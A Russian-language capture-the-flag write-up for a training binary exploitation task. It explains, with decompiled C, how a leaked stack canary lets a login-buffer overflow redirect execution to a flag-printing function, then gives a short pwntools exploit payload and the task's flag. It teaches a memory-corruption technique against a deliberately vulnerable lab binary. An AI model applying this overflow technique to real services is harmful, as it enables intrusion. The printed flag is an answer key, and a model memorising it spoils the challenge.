[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn2_simple_surprise_2)
Описание:
Get the flag
`nc 109.233.56.90 11612`
**[simple_surprise_2](https://pwn.spbctf.ru/files/canary/simple_suprprise_2_fixed)**

В точке входа генерируется случайное значение канарейки и выводится в терминал:
``` c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned int time; // eax
  int v4; // eax

  time = ::time(nullptr);
  srand(time);
  v4 = rand();
  LOBYTE(v4) = 0;
  canary = v4;

  printf("I am here %p %x\n", main, v4);
  fflush(stdout);
  func_A();
  puts("Auth finished");
  return 0;
}
```

В функции `func_A` происходит считывание логина с консоли. Необходимо тут переполнить буфер, перезаписать канарейку и указать адрес возврата на функцию `print_flag`.
``` c
__int64 func_A()
{
  size_t login_len; // rax
  __int64 result; // rax
  char login[44]; // [rsp+0h] [rbp-30h] BYREF
  int canary; // [rsp+2Ch] [rbp-4h]

  canary = ::canary;

  memset(login, 0, 0x20u);
  write(1, "Login:\n", 7u);
  read(0, login, 100u);
  write(1, "Welcome,", 8u);
  login_len = strlen(login);
  write(1, login, login_len);
  write(1, "\n", 1u);
  read(0, login, 100u);

  if ( !strcmp(login, "pass") )
    write(1, "OK\n", 3u);
  else
    write(1, "No\n", 3u);

  result = (unsigned int)::canary;
  if ( canary != ::canary )
  {
    printf("Fail %x %x\n", canary, ::canary);
    fflush(stdout);
    exit(1);
  }
  return result;
}
```

Эксплоит:
``` python
io = start()

io.recvuntil(b'here ')
io.recvuntil(b' ')
canary = int(io.recvline().decode(), 16)

payload = b'pass\x00' + b'A' * 39 + p32(canary) + b'B' * 8 + p64(0x401260)
io.sendline(b'\n')
io.sendline(payload)

io.interactive()
```

Ответ: `spbctf{B1N4RY_2_DZ_HA4RD}`